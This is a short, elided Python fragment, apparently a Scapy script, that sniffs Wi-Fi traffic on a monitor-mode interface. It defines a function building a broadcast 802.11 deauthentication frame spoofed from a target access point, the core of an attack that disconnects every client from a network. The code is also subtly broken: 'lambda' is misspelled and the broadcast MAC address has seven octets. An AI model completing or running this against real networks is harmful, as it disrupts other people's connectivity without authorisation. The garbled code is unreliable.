...
def get_wifi_networks(interface="wlan0mon"):
    ...
    try:
        scan_result = sniff(iface=interface, timeout=10, prn=lamba x:
x.summary())
...
def deauth_all_devices(target_bssid, iface="wlan0mon"):
    deauth_packet = RadioTap() / Dot11(addr1="ff:ff:ff:ff:ff:ff:ff", addr2=target_bssid, addr3=target_bssid) / Dot11Deauth ()
